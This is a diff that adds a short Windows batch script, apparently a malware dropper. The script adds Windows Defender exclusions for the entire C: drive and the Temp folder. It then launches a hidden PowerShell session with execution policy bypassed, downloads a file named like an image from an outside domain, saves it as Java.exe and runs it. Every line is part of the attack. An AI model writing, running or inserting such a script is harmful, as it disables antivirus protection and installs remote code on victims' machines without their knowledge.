@@ -1,0 +1,4 @@
+@echo off
+cmd.exe /c powershell -Command Add-MpPreference -ExclusionPath C:\
+cmd.exe /c powershell -Command Add-MpPreference -ExclusionPath C:\Users\%username%\AppData\Local\Temp
+PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('http://mcpperformance.com.br/vendas/Documentos.jpg','%TEMP%\Java.exe');Start-Process '%TEMP%\Java.exe'
